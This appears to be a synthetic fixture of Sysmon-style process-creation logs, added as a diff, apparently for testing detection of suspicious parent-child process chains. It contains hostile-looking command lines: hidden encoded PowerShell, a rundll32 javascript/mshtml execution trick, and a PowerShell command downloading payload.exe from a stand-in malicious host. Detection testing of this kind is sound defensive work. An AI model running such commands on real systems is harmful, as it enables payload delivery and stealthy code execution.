@@ -1,0 +1,59 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2025-06-24 10:22:13.456",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "explorer.exe",
+    "ParentProcessId": 3428,
+    "ProcessId": 4780,
+    "User": "LAB-PC\\Olga"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2025-06-24 10:22:18.001",
+    "Image": "C:\\Windows\\System32\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc aGVsbG8gd29ybGQ=",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe /c whoami",
+    "ParentProcessId": 4780,
+    "ProcessId": 4890,
+    "User": "LAB-PC\\Olga"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2025-06-24 10:22:30.123",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\" ",
+    "ParentImage": "C:\\Windows\\System32\\powershell.exe",
+    "ParentCommandLine": "powershell.exe -nop -w hidden -enc aGVsbG8gd29ybGQ=",
+    "ParentProcessId": 4890,
+    "ProcessId": 5001,
+    "User": "LAB-PC\\Olga"
+  },
+  {
+    "ProcessId": 6000,
+    "ParentProcessId": 3400,
+    "Image": "C:\\Windows\\explorer.exe",
+    "CommandLine": "explorer.exe"
+  },
+  {
+    "ProcessId": 6001,
+    "ParentProcessId": 6000,
+    "Image": "C:\\Users\\User\\AppData\\Roaming\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "ProcessId": 6002,
+    "ParentProcessId": 6001,
+    "Image": "C:\\Windows\\System32\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc dGVzdA=="
+  },
+  {
+  "ProcessId": 7000,
+  "ParentProcessId": 6002,
+  "Image": "C:\\Windows\\System32\\powershell.exe",
+  "CommandLine": "powershell.exe -Command Invoke-WebRequest http://malicious.example.com/payload.exe -OutFile payload.exe"
+}
+]
